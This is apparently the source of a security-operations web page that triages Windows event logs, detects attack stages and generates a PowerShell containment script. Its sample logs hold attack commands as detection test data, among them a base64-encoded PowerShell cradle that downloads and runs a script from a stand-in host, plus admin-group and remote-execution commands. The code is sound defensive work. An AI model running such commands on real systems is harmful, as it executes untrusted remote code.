import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { PageShell } from "@/components/PageShell";
import { AnalyzerShell } from "@/components/soc";
import type { AnalyzerState } from "@/components/soc";
import { Panel, Chip } from "@/components/soc";
import { Empty, AnalysisLoading, ResultBanner } from "@/components/output";
import { IOCTable, MitrePanel, TimelinePanel } from "@/components/investigation";
import { sendArtifact } from "@/lib/handoff";
import { toast } from "sonner";
import { createCaseFromAnalysis } from "@/data/case-factory";
import { analyzeLogArtifact, type LogsAnalysisResult } from "@/lib/logArtifact";
import { buildLocalHistory } from "@/lib/correlation/history";
import { rememberCorrelation } from "@/lib/correlation";
import { EntitySection } from "@/components/entity";
import { useWorkspaceState } from "@/lib/use-workspace-state";
import { ResumeBanner } from "@/components/ResumeBanner";
import {
  FileText, AlertTriangle, ShieldAlert, ArrowRight,
  Terminal, Crosshair, FileWarning,
  ListChecks, Clock, Users, Globe, Activity, Workflow,
  Copy, Download, Code2, Shield, Search, Check, Layers, X,
  Cpu, ShieldCheck,
} from "lucide-react";
import { copyText } from "@/lib/copy";
import { translateAll, toSigmaRule } from "@/lib/siem/query-translator";
import { DecodedPayloadPopover } from "@/components/siem/DecodedPayloadPopover";
import { detectAndDeobfuscate } from "@/lib/siem/payload-deobfuscator";
import { ProcessTreeVisualizer } from "@/components/logs/ProcessTreeVisualizer";
import { ErrorBoundary } from "@/components/ErrorBoundary";

export const Route = createFileRoute("/logs")({ component: LogsPage });

const SAMPLES: Record<string, { label: string; body: string }> = {
  brute_force: {
    label: "RDP Brute Force",
    body: `LogName: Security\nEventID: 4625\nAccountName: Administrator\nSourceIP: 185.220.101.161\nStatus: 0xC000006D\n\nLogName: Security\nEventID: 4625\nAccountName: Administrator\nSourceIP: 185.220.101.161\nStatus: 0xC000006A\n\nLogName: Security\nEventID: 4625\nAccountName: Administrator\nSourceIP: 185.220.101.161\nStatus: 0xC000006D\n\nLogName: Security\nEventID: 4625\nAccountName: Administrator\nSourceIP: 45.33.32.156\nStatus: 0xC000006D\n\nLogName: Security\nEventID: 4625\nAccountName: Admin\nSourceIP: 185.220.101.161`,
  },
  powershell_ransom: {
    label: "PowerShell Encoded",
    body: `LogName: Windows PowerShell\nEventID: 4104\nUser: NT AUTHORITY\\SYSTEM\nScriptBlock: Invoke-Expression -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AaABvAHMAdAAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkACgA=\n\nLogName: Security\nEventID: 4688\nProcessName: powershell.exe\nCommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AaABvAHMAdAAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkACgA=\n\nLogName: Security\nEventID: 4697\nServiceName: RansomService\nBinaryPath: C:\\Users\\Public\\svchost.exe`,
  },
  privilege_escalation: {
    label: "Priv Escalation",
    body: `LogName: Security\nEventID: 4672\nAccountName: user01\nPrivileges: SeTcbPrivilege SeDebugPrivilege\n\nLogName: Security\nEventID: 4673\nAccountName: user01\nService: SeSecurityPrivilege\n\nLogName: Security\nEventID: 4648\nAccountName: user01\nTargetServer: DC01.corp.local\nProcessName: cmd.exe\n\nLogName: Security\nEventID: 4728\nAccountName: user01\nGroup: Domain Admins\nSubjectUser: Administrator\n\nLogName: Security\nEventID: 4688\nProcessName: net.exe\nCommandLine: net localgroup Administrators user01 /add`,
  },
  service_persistence: {
    label: "Persistence Chain",
    body: `LogName: Security\nEventID: 4697\nServiceName: WinUpdateService\nBinaryPath: C:\\Windows\\Tasks\\svchost.exe\n\nLogName: Security\nEventID: 4698\nTaskName: \\Microsoft\\Windows\\Updater\nTaskContent: <Command>C:\\Windows\\Tasks\\update.exe</Command>\n\nLogName: Security\nEventID: 4657\nObjectName: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nValue: MalwareUpdate\n\nLogName: Security\nEventID: 5156\nProcessName: C:\\Windows\\Tasks\\svchost.exe\nRemoteIP: 5.188.62.18\nRemotePort: 8443\n\nLogName: Security\nEventID: 4688\nProcessName: wmic.exe\nCommandLine: wmic /node:DC01 process call create "powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA="`,
  },
  log_clearing: {
    label: "Log Tampering",
    body: `LogName: Security\nEventID: 1102\nSubjectUser: user01\nSubjectLogonId: 0x123ABC\nProvider: Microsoft-Windows-EventLog\n\nLogName: Security\nEventID: 4616\nPreviousTime: 2024-05-15T10:00:00Z\nNewTime: 2024-01-01T00:00:00Z\nSubjectUser: user01\n\nLogName: System\nEventID: 104\nProvider: EventLog\nDetails: The event log file was cleared\n\nLogName: Security\nEventID: 4672\nAccountName: user01\nPrivileges: SeBackupPrivilege SeRestorePrivilege`,
  },
  normal_events: {
    label: "Normal Baseline",
    body: `LogName: Security\nEventID: 4624\nAccountName: user01\nLogonType: 2\nSourceIP: 192.168.1.50\n\nLogName: Security\nEventID: 4634\nAccountName: user01\nLogonType: 2\n\nLogName: System\nEventID: 6005\nProvider: EventLog\nMessage: The Event log service was started.\n\nLogName: System\nEventID: 12\nProvider: Driver\nMessage: Driver \\Driver\\WudfRd loaded.\n\nLogName: Application\nEventID: 0\nSource: .NET Runtime\nMessage: Application started successfully`,
  },
};

function EmptyPreview() {
  const cards: Array<[string, string, typeof FileText]> = [
    ["Log Parsing", "Parse raw logs, Windows Event Logs, Sysmon, and SIEM-formatted entries", FileText],
    ["Event Detection", "30+ detection rules — brute force, persistence, defense evasion, credential abuse", ListChecks],
    ["IOC Extraction", "Extract IPs, hosts, users, and processes from structured log data", Globe],
    ["MITRE Mapping", "Techniques mapped to ATT&CK — privilege escalation, execution, persistence", Crosshair],
    ["Timeline Reconstruction", "Chronological view of log events with severity classification", Clock],
    ["Case Integration", "Push findings, IOCs, and evidence directly to the Case workspace", ArrowRight],
  ];
  return (
    <div className="grid grid-cols-2 gap-3">
      {cards.map(([a, b, Icon]) => (
        <Panel key={a} title="" bodyClassName="text-mono ba-text-sm text-muted-foreground">
          <div className="mb-1 flex items-center gap-1.5 text-mono ba-text-2xs font-medium text-foreground">
            <Icon className="h-3.5 w-3.5 text-primary/70" />
            {a}
          </div>
          {b}
        </Panel>
      ))}
    </div>
  );
}

function LogsPage() {
  const navigate = useNavigate({ from: "/logs" });
  const [toolState, setToolState] = useState<AnalyzerState>("empty");
  const [activeTab, setActiveTab] = useState<"signals" | "inspector" | "iocs" | "timeline" | "mitre" | "transpiler" | "processtree" | "containment">("signals");
  const [logDraft, setLogDraft] = useState("");
  const [activeSample, setActiveSample] = useState("");

  const [analysis, setAnalysis] = useState<LogsAnalysisResult | null>(null);
  const [errorMsg, setErrorMsg] = useState("");
  const { pending, accept, save, clear: wsClear } = useWorkspaceState("logs");

  // Forensic Inspector & Transpiler State
  const [highlightedLine, setHighlightedLine] = useState<number | null>(null);
  const [inspectorFilter, setInspectorFilter] = useState<"all" | "matched">("all");
  const [inspectorSearch, setInspectorSearch] = useState("");
  const [transpilerEngine, setTranspilerEngine] = useState<"sigma" | "splunk" | "elastic" | "sentinel" | "vql">("sigma");
  const [copiedQuery, setCopiedQuery] = useState(false);
  const [copiedRemediation, setCopiedRemediation] = useState(false);
  const [jumpInput, setJumpInput] = useState("");

  const committed = toolState === "analyzing" || toolState === "loaded";

  const result = useMemo(() => {
    if (!committed || !logDraft.trim()) return null;
    return analyzeLogArtifact({ logData: logDraft, committed: true }, { history: buildLocalHistory() });
  }, [logDraft, committed]);

  const attackNarrative = useMemo(() => {
    if (!analysis) return null;
    const txt = logDraft.toLowerCase();
    const hasBrute = txt.includes("4625") || analysis.displayFindings.some(f => f.title.toLowerCase().includes("brute"));
    const hasPsEnc = txt.includes("4104") || txt.includes("-enc") || txt.includes("powershell");
    const hasPriv = txt.includes("4672") || txt.includes("4728") || txt.includes("sedebugprivilege") || txt.includes("privilege");
    const hasService = txt.includes("4697") || txt.includes("4698") || txt.includes("servicename") || txt.includes("updater");
    const hasClear = txt.includes("1102") || txt.includes("104") || txt.includes("cleared");

    const stages: Array<{ phase: string; description: string; ttp: string; severity: "critical" | "high" | "medium" | "info" }> = [];

    if (hasBrute) {
      stages.push({
        phase: "Initial Access",
        description: `Adversary conducted authentication attempts / brute force (EventID 4625) targeting ${analysis.logSummary.uniqueUsers.join(", ") || "Administrator accounts"} from IP(s) ${analysis.logSummary.uniqueIPs.join(", ") || "external sources"}.`,
        ttp: "T1110.001 Password Guessing",
        severity: "critical",
      });
    }

    if (hasPriv) {
      stages.push({
        phase: "Privilege Escalation",
        description: `Privileged token manipulation detected (EventID 4672/4728). Process exercised administrative rights (SeDebugPrivilege / SeTcbPrivilege) or modified security groups to gain domain persistence.`,
        ttp: "T1078 Valid Accounts / T1098 Account Manipulation",
        severity: "critical",
      });
    }

    if (hasPsEnc) {
      stages.push({
        phase: "Execution & Evasion",
        description: `Obfuscated PowerShell execution (EventID 4104 / 4688). In-memory download cradle calls Net.WebClient and IEX to stage secondary payloads without disk footprint.`,
        ttp: "T1059.001 PowerShell / T1027 Obfuscated Files",
        severity: "high",
      });
    }

    if (hasService) {
      stages.push({
        phase: "Persistence",
        description: `Windows Service or Scheduled Task registered (EventID 4697/4698). Malicious binary anchored to system startup sequence to survive reboots.`,
        ttp: "T1543.003 Windows Service / T1053 Scheduled Task",
        severity: "high",
      });
    }

    if (hasClear) {
      stages.push({
        phase: "Defense Evasion",
        description: `Security Event Log was cleared or tampered with (EventID 1102 / 104) and system timestamps altered to impede incident response analysis.`,
        ttp: "T1070.001 Clear Windows Event Logs",
        severity: "critical",
      });
    }

    const summaryText = stages.length > 0
      ? `Multi-stage adversary intrusion detected across ${stages.length} kill-chain phases: ${stages.map(s => s.phase).join(" → ")}. Immediate containment required.`
      : "Baseline log telemetry triaged. No anomalous multi-stage intrusion signatures detected in current sample.";

    const nonLoopbackIps = analysis.logSummary.uniqueIPs.filter(ip => !ip.startsWith("127.") && !ip.startsWith("192.168.") && !ip.startsWith("10."));
    const targetUsers = analysis.logSummary.uniqueUsers.filter(u => !u.includes("SYSTEM") && !u.includes("LOCAL SERVICE") && !u.includes("NETWORK SERVICE"));

    const remediationScript = `# BeyondArch SOC Incident Remediation Playbook
# Target Host: Triaged Windows Endpoint
# Incident Timestamp: ${new Date().toISOString()}

Write-Host "[*] Executing BeyondArch Emergency Containment Playbook..." -ForegroundColor Yellow

# 1. Terminate Rogue Processes
${analysis.logSummary.uniqueProcesses.map(p => `$procs = Get-Process -Name "${p.replace(".exe", "")}" -ErrorAction SilentlyContinue; if ($procs) { $procs | Stop-Process -Force; Write-Host "[-] Terminated suspicious process: ${p}" -ForegroundColor Red }`).join("\n") || "# No specific rogue process identified in process metadata"}

# 2. Block Attacking IP Addresses on Windows Firewall
${nonLoopbackIps.map(ip => `New-NetFirewallRule -DisplayName "BeyondArch Block ${ip}" -Direction Inbound -RemoteAddress "${ip}" -Action Block -ErrorAction SilentlyContinue\nNew-NetFirewallRule -DisplayName "BeyondArch Block Egress ${ip}" -Direction Outbound -RemoteAddress "${ip}" -Action Block -ErrorAction SilentlyContinue`).join("\n") || "# Attacking IPs are private or internal"}

# 3. Disable Compromised / Targeted Accounts for Triage
${targetUsers.map(u => `Disable-LocalUser -Name "${u}" -ErrorAction SilentlyContinue\nWrite-Host "[!] Disabled local user: ${u}" -ForegroundColor Yellow`).join("\n") || "# No non-system user targeted"}

# 4. Enforce Audit Policy Integrity & Log Protection
Auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
Auditpol /set /subcategory:"Logon" /success:enable /failure:enable
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

Write-Host "[+] Containment actions executed. Preserving RAM & disk for forensic acquisition." -ForegroundColor Green
`;

    return { stages, summaryText, remediationScript };
  }, [analysis, logDraft]);

  const translatedQueries = useMemo(() => {
    if (!analysis) return null;
    const mainFinding = analysis.displayFindings[0]?.title || "Suspicious Log Activity Pattern";
    const mitreIds = (analysis.mitre || []).map((m: any) => (typeof m === "string" ? m : m.id || ""));
    const chips: any[] = [];
    if (analysis.logSummary.uniqueIPs[0]) {
      chips.push({ field: "src", value: analysis.logSummary.uniqueIPs[0] });
    }
    if (analysis.logSummary.uniqueUsers[0]) {
      chips.push({ field: "user", value: analysis.logSummary.uniqueUsers[0] });
    }
    return translateAll(mainFinding, chips, "all", mitreIds);
  }, [analysis]);

  const matchesByLine = useMemo(() => {
    const map = new Map<number, NonNullable<typeof analysis>["matches"]>();
    if (!analysis?.matches) return map;
    for (const m of analysis.matches) {
      const list = map.get(m.line) || [];
      list.push(m);
      map.set(m.line, list);
    }
    return map;
  }, [analysis]);

  const rawLines = useMemo(() => {
    return logDraft.split("\n");
  }, [logDraft]);

  const filteredInspectorLines = useMemo(() => {
    return rawLines
      .map((text, idx) => ({ lineNum: idx + 1, text }))
      .filter(({ lineNum, text }) => {
        if (inspectorFilter === "matched" && !matchesByLine.has(lineNum)) return false;
        if (inspectorSearch.trim() && !text.toLowerCase().includes(inspectorSearch.toLowerCase())) return false;
        return true;
      });
  }, [rawLines, inspectorFilter, inspectorSearch, matchesByLine]);

  const jumpToLine = (line: number) => {
    setHighlightedLine(line);
    setActiveTab("inspector");
    setTimeout(() => {
      const el = document.getElementById(`log-inspector-line-${line}`);
      if (el) {
        el.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    }, 100);
  };

  const linesForFinding = (findingTitle: string) => {
    if (!analysis?.matches) return [];
    const lines = analysis.matches
      .filter((m) => m.rule.title === findingTitle)
      .map((m) => m.line);
    return [...new Set(lines)].sort((a, b) => a - b);
  };

  const contextForFinding = (findingTitle: string) => {
    if (!analysis?.matches) return "";
    const lineIndices = analysis.matches
      .filter((m) => m.rule.title === findingTitle)
      .map((m) => m.line);
    if (lineIndices.length > 0) {
      return lineIndices.map((ln) => rawLines[ln - 1] || "").join("\n");
    }
    return analysis.matches
      .filter((m) => m.rule.title === findingTitle)
      .map((m) => m.context)
      .join("\n");
  };

  useEffect(() => {
    if (result?.correlation?.length) rememberCorrelation(result.correlation, { source: "logs" });
  }, [result]);

  useEffect(() => {
    if (result) { setAnalysis(result); setToolState("loaded"); setErrorMsg(""); save({ artifact: logDraft, analysis: result }); }
    else if (committed && !logDraft.trim()) {
      setErrorMsg("Log data is required.");
      setToolState("error");
    }
  }, [result, committed, logDraft, save]);

  useEffect(() => {
    if (activeSample && SAMPLES[activeSample]) {
      setLogDraft(SAMPLES[activeSample].body);
      setToolState("analyzing");
      setActiveSample(activeSample);
    }
  }, [activeSample]);

  function pasteFromClipboard() {
    navigator.clipboard.readText().then(t => {
      if (t) { setLogDraft(t); setToolState("analyzing"); }
    }).catch(() => toast.error("Cannot read clipboard"));
  }

  const canRun = !!logDraft.trim() && toolState !== "analyzing";

  const run = () => {
    if (canRun) { setToolState("analyzing"); save({ artifact: logDraft }); }
  };

  const clear = () => {
    setLogDraft(""); setAnalysis(null); setErrorMsg(""); setToolState("empty"); wsClear();
  };

  return (
    <ErrorBoundary name="LogsPage">
      <PageShell
        title="Windows Security & Sysmon Forensics"
        eyebrow="triage / windows logs"
        description="Forensic triage of Windows Security Event Logs and Sysmon — EID 4624/4625 (Logon), 4688/Sysmon 1 (Process Tree), 7045/4697 (Services), 1102 (Log Clearing), and 4104 (PowerShell ScriptBlock)."
        crumbs={[{ label: "Triage" }, { label: "Windows Logs" }]}
      >
      <AnalyzerShell
        icon={FileText}
        title="Windows Event & Sysmon Triage"
        purpose="Parse and triage Windows Event Logs & Sysmon streams — detect brute force, lateral movement, persistence, and defense evasion."
        state={toolState}
        canRun={canRun}
        onRun={run}
        onClear={clear}
        resumeBanner={pending && (
          <ResumeBanner
            artifact={pending.artifact}
            updatedAt={pending.updatedAt}
            onResume={() => {
              const s = accept();
              if (s) {
                setLogDraft(s.artifact);
                const a = s.analysis as LogsAnalysisResult | null;
                if (a) { setAnalysis(a); setToolState("loaded"); }
              }
            }}
            onStartFresh={wsClear}
          />
        )}
        intake={
          <>
            <Panel title="Log Input">
              <div className="space-y-3">
                <label htmlFor="ba-log-input" className="text-mono ba-text-2xs text-muted-foreground">Raw log data</label>
                <textarea
                  id="ba-log-input"
                  value={logDraft}
                  onChange={e => { setLogDraft(e.target.value); if (e.target.value.trim()) setToolState("analyzing"); }}
                  rows={12}
                  placeholder={`Paste raw logs — Windows Event Log, Sysmon, SIEM, or generic.\n\nDetection rules include:\n- 4625 (failed login)\n- 4103/4104 (PowerShell)\n- 4697/4698 (service/task creation)\n- 1102 (log clearing)\n- Encoded commands\n- LOLBIN execution\n- AMSI bypass patterns\n- Brute force detection`}
                  className="w-full resize-y rounded border border-divider-strong bg-surface-0 p-2 text-mono ba-text-sm text-foreground outline-none placeholder:text-fg-dim focus:border-primary/50 font-mono"
                />
                <div className="flex items-center gap-2">
                  <button onClick={pasteFromClipboard}
                    className="flex items-center gap-1.5 rounded border border-subtle bg-surface-1 px-2.5 py-1.5 text-mono ba-text-2xs text-muted-foreground hover:text-foreground">
                    Paste
                  </button>
                  {toolState !== "empty" && (
                    <>
                      <span className="text-mono ba-text-2xs text-muted-foreground">
                        {logDraft.split("\n").filter(Boolean).length} lines — {(logDraft.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g) || []).length} IPs
                      </span>
                      <button onClick={() => { setLogDraft(""); setAnalysis(null); setToolState("empty"); }}
                        className="text-mono ba-text-2xs text-muted-foreground hover:text-destructive">Clear</button>
                    </>
                  )}
                </div>
              </div>
            </Panel>

            <Panel title="Samples" priority="secondary">
              <div className="space-y-1.5">
                {Object.entries(SAMPLES).map(([id, s]) => (
                  <button key={id} onClick={() => setActiveSample(id)}
                    className={"group flex w-full items-center gap-2 rounded border px-2 py-1.5 text-left transition-colors duration-150 " + (activeSample === id ? "border-primary/50 bg-primary/10" : "border-border/60 bg-surface-0 hover:border-primary/40")}>
                    <FileWarning className="h-3.5 w-3.5 shrink-0 text-muted-foreground group-hover:text-primary" />
                    <div className="min-w-0 flex-1">
                      <div className="truncate text-mono ba-text-sm text-foreground">{s.label}</div>
                      <div className="text-mono ba-text-2xs text-muted-foreground">{s.body.split("\n").filter(Boolean).length} lines</div>
                    </div>
                  </button>
                ))}
              </div>
            </Panel>
          </>
        }
        resultBanner={toolState === "loaded" && analysis ? (
          <ResultBanner
            badge={analysis.summary.verdict === "malicious" ? "critical" as const : analysis.summary.verdict === "suspicious" ? "warning" as const : "success" as const}
            title={`Log Analysis — ${analysis.logSummary.totalLines} lines`}
            subtitle={`${analysis.logSummary.matchedLines} matched · ${analysis.logSummary.uniqueEventIds.length} event types`}
            metrics={[
              { label: "Score", value: analysis.summary.score, tone: analysis.summary.score > 60 ? "destructive" : analysis.summary.score > 20 ? "warning" : "primary" },
              { label: "Critical/High", value: analysis.displayFindings.filter(f => f.severity === "critical" || f.severity === "high").length, tone: "destructive" },
              { label: "IOCs", value: analysis.iocs.length, tone: "destructive" },
              { label: "MITRE", value: analysis.mitre.length, tone: "primary" },
            ]}
          />
        ) : undefined}
        exportJson={toolState === "loaded" && analysis ? () => {
          const blob = new Blob([JSON.stringify(analysis, null, 2)], { type: "application/json" });
          const url = URL.createObjectURL(blob);
          const a = document.createElement("a"); a.href = url; a.download = `log-analysis-${Date.now()}.json`; a.click();
          URL.revokeObjectURL(url);
        } : undefined}
        onCreateInvestigation={toolState === "loaded" && analysis ? () => {
          const { investigation } = createCaseFromAnalysis(analysis);
          toast.success(`Investigation created: ${investigation.case.title}`);
          navigate({ to: "/case" });
        } : undefined}
        sendToTargets={toolState === "loaded" && analysis ? [
          {
            label: "SIEM Workspace",
            to: "/siem",
            icon: ShieldAlert,
            onClick: () => {
              localStorage.setItem("beyondlabs.siem.prefill", logDraft);
              sendArtifact({ kind: "log", value: logDraft, source: "/logs" });
            },
          },
          { label: "Detection", to: "/detection", icon: AlertTriangle, onClick: () => sendArtifact({ kind: "ip", value: analysis.logSummary.uniqueIPs[0] ?? "unknown", source: "/logs" }) },
          { label: "Case Notebook", to: "/case", icon: ArrowRight, onClick: () => sendArtifact({ kind: "ip", value: analysis.logSummary.uniqueIPs[0] ?? "unknown", source: "/logs" }) },
          { label: "MITRE", to: "/mitre", icon: Crosshair, onClick: () => sendArtifact({ kind: "ip", value: analysis.logSummary.uniqueIPs[0] ?? "unknown", source: "/logs" }) },
          { label: "Timeline", to: "/timeline", icon: Clock, onClick: () => sendArtifact({ kind: "ip", value: analysis.logSummary.uniqueIPs[0] ?? "unknown", source: "/logs" }) },
        ] : undefined}
      >
        {toolState === "empty" && (
          <Panel><EmptyPreview /></Panel>
        )}

        {toolState === "error" && (
          <Panel>
            <div className="flex items-center justify-center py-12">
              <div className="text-center">
                <AlertTriangle className="mx-auto h-8 w-8 text-destructive/80" />
                <p className="mt-3 text-mono ba-text-sm font-medium text-destructive">Analysis failed</p>
                <p className="mt-1 text-mono ba-text-xs text-muted-foreground">{errorMsg || "An unexpected error occurred."}</p>
              </div>
            </div>
          </Panel>
        )}

        {toolState === "analyzing" && !analysis && (
          <Panel><AnalysisLoading label="Analyzing logs..." /></Panel>
        )}

        {toolState === "loaded" && analysis && (
          <>
            <div className="grid grid-cols-5 gap-3">
              {[
                { icon: FileText, label: "Total Lines", value: analysis.logSummary.totalLines },
                { icon: ListChecks, label: "Matched", value: analysis.logSummary.matchedLines, tone: analysis.logSummary.matchedLines > 0 ? "warning" : "success" },
                { icon: Users, label: "Users", value: analysis.logSummary.uniqueUsers.length },
                { icon: Globe, label: "IPs", value: analysis.logSummary.uniqueIPs.length, tone: "info" },
                { icon: Terminal, label: "Processes", value: analysis.logSummary.uniqueProcesses.length },
              ].map((m, i) => (
                <div key={i} className="rounded border border-border/60 bg-surface-1 p-3 text-center">
                  <m.icon className="mx-auto h-4 w-4 text-muted-foreground" />
                  <div className="mt-1 font-mono text-lg font-bold text-foreground">{String(m.value)}</div>
                  <div className="text-mono ba-text-2xs text-muted-foreground">{m.label}</div>
                </div>
              ))}
            </div>

            {attackNarrative && attackNarrative.stages.length > 0 && (
              <div className="rounded-lg border border-border/80 bg-surface-1/80 p-3.5 space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2 pb-2 border-b border-border/40">
                  <div className="flex items-center gap-2">
                    <ShieldAlert className="h-4 w-4 text-destructive" />
                    <span className="text-mono ba-text-xs font-bold uppercase tracking-wider text-foreground">
                      Correlated Multi-Stage Incident Narrative
                    </span>
                  </div>
                  <span className="text-mono ba-text-2xs text-destructive font-semibold">
                    {attackNarrative.stages.length} Kill-Chain Stages Detected
                  </span>
                </div>

                <p className="text-mono ba-text-xs text-foreground/90 leading-relaxed">
                  {attackNarrative.summaryText}
                </p>

                {/* Kill-Chain Stages Flow */}
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
                  {attackNarrative.stages.map((stg, i) => (
                    <div key={i} className="rounded border border-subtle bg-surface-0 p-2.5 space-y-1">
                      <div className="flex items-center justify-between">
                        <span className="text-mono ba-text-xs font-bold text-foreground">{stg.phase}</span>
                        <Chip tone={stg.severity === "critical" ? "destructive" : "warning"}>{stg.severity}</Chip>
                      </div>
                      <p className="text-mono ba-text-3xs text-muted-foreground leading-normal">{stg.description}</p>
                      <div className="pt-1 text-mono ba-text-3xs text-primary truncate">{stg.ttp}</div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            <div className="sticky top-[calc(var(--ba-topbar-h)+1rem+var(--ba-header-h))] z-10 flex flex-wrap items-center gap-1 border-b border-border bg-background/95 pb-1 mb-2 pt-0.5 backdrop-blur-sm">
              {[
                { id: "signals" as const, label: `Signals (${analysis.displayFindings.length})` },
                { id: "processtree" as const, label: "Process Lineage Tree" },
                { id: "containment" as const, label: "1-Click Containment" },
                { id: "inspector" as const, label: `Log Inspector (${rawLines.length}L)` },
                { id: "iocs" as const, label: `IOCs (${analysis.iocs.length})` },
                { id: "timeline" as const, label: `Timeline (${analysis.logSummary.timeline.length})` },
                { id: "mitre" as const, label: `MITRE (${analysis.mitre.length})` },
                { id: "transpiler" as const, label: "Multi-SIEM Transpiler (5)" },
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={
                    "rounded px-2.5 py-1 text-mono ba-text-2xs transition-colors duration-150 " +
                    (activeTab === tab.id
                      ? "border border-primary/50 bg-primary/10 text-primary font-semibold"
                      : "text-muted-foreground hover:text-foreground")
                  }
                >
                  {tab.label}
                </button>
              ))}
            </div>

            {activeTab === "signals" && (
              <div>
                {analysis.displayFindings.length === 0 ? (
                  <Panel><Empty title="No signals" hint="No detection rules triggered. Logs appear clean." /></Panel>
                ) : (
                  analysis.displayFindings.map((f, i) => {
                    const findingLines = linesForFinding(f.title);
                    const matchedContext = contextForFinding(f.title);
                    const deobPayload = detectAndDeobfuscate(matchedContext || f.reason);

                    return (
                      <div key={i} className="mb-2 last:mb-0">
                        <Panel key={i} title="" bodyClassName="p-0">
                          <div
                            className={
                              "border-l-2 px-4 py-3 " +
                              (f.severity === "critical"
                                ? "border-destructive/40"
                                : f.severity === "high"
                                ? "border-destructive/30"
                                : f.severity === "medium"
                                ? "border-warning/30"
                                : "border-info/30")
                            }
                          >
                            <div className="flex flex-wrap items-start justify-between gap-2">
                              <div className="flex flex-wrap items-center gap-2">
                                <Chip
                                  tone={
                                    f.severity === "critical" || f.severity === "high"
                                      ? "destructive"
                                      : f.severity === "medium"
                                      ? "warning"
                                      : "info"
                                  }
                                >
                                  {f.severity}
                                </Chip>
                                <span className="text-mono ba-text-sm font-medium text-foreground">{f.title}</span>
                                {f.technique && <Chip tone="destructive">{f.technique}</Chip>}
                                {f.confidence && f.confidence.level !== "unknown" && (
                                  <Chip tone="primary">confidence: {f.confidence.level}</Chip>
                                )}
                                {deobPayload && (
                                  <DecodedPayloadPopover rawText={matchedContext || f.reason} />
                                )}
                              </div>

                              {/* Jump to Line Quick Access */}
                              {findingLines.length > 0 && (
                                <div className="flex items-center gap-1">
                                  <span className="text-mono ba-text-3xs text-muted-foreground hidden sm:inline">
                                    Origin:
                                  </span>
                                  {findingLines.slice(0, 5).map((ln) => (
                                    <button
                                      key={ln}
                                      onClick={() => jumpToLine(ln)}
                                      className="rounded border border-primary/40 bg-primary/10 px-1.5 py-0.5 text-mono ba-text-3xs text-primary hover:bg-primary/20 transition-colors"
                                      title={`Jump to line ${ln} in Forensic Log Inspector`}
                                    >
                                      L{ln}
                                    </button>
                                  ))}
                                  {findingLines.length > 5 && (
                                    <span className="text-mono ba-text-3xs text-muted-foreground">
                                      +{findingLines.length - 5}
                                    </span>
                                  )}
                                </div>
                              )}
                            </div>
                            <p className="mt-1.5 text-mono ba-text-sm text-fg-dim">{f.reason}</p>
                            <p className="mt-1 text-mono ba-text-2xs text-muted-foreground">Recommendation: {f.action}</p>
                          </div>
                        </Panel>
                      </div>
                    );
                  })
                )}
              </div>
            )}

            {activeTab === "processtree" && (
              <Panel title="Process Execution Lineage & LOLBAS Inspection">
                <ProcessTreeVisualizer logText={logDraft} />
              </Panel>
            )}

            {activeTab === "containment" && attackNarrative && (
              <Panel title="1-Click Incident Containment & Remediation Console">
                <div className="space-y-4">
                  <div className="rounded-lg border border-subtle bg-surface-1 p-3.5 space-y-3">
                    <div className="flex flex-wrap items-center justify-between gap-2 pb-2 border-b border-border/40">
                      <div className="flex items-center gap-2">
                        <Terminal className="h-4 w-4 text-primary" />
                        <span className="font-mono ba-text-xs font-semibold text-foreground">
                          Target Endpoint Remediation Script (Windows PowerShell)
                        </span>
                      </div>
                      <button
                        onClick={() => {
                          copyText(attackNarrative.remediationScript);
                          setCopiedRemediation(true);
                          toast.success("Containment PowerShell script copied to clipboard");
                          setTimeout(() => setCopiedRemediation(false), 2000);
                        }}
                        className="inline-flex items-center gap-1 text-mono ba-text-3xs text-muted-foreground hover:text-primary rounded border border-border bg-surface-0 px-2 py-1"
                      >
                        {copiedRemediation ? <Check className="h-3 w-3 text-success" /> : <Copy className="h-3 w-3" />}
                        {copiedRemediation ? "copied" : "copy containment script"}
                      </button>
                    </div>
                    <pre className="font-mono ba-text-3xs text-muted-foreground overflow-x-auto whitespace-pre p-2 bg-surface-0 rounded border border-border/30 max-h-[460px] overflow-y-auto">
                      {attackNarrative.remediationScript}
                    </pre>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-mono ba-text-3xs">
                    <div className="p-2.5 rounded border border-subtle bg-surface-0">
                      <span className="text-destructive font-bold block mb-0.5">1. Process Neutralization</span>
                      <span className="text-muted-foreground">Kills detected malicious process trees via Stop-Process -Force immediately.</span>
                    </div>
                    <div className="p-2.5 rounded border border-subtle bg-surface-0">
                      <span className="text-amber-400 font-bold block mb-0.5">2. Network Quarantine</span>
                      <span className="text-muted-foreground">Installs bidirectional blocking rules on Windows Defender Firewall for external attacking IPs.</span>
                    </div>
                    <div className="p-2.5 rounded border border-subtle bg-surface-0">
                      <span className="text-primary font-bold block mb-0.5">3. Account Containment</span>
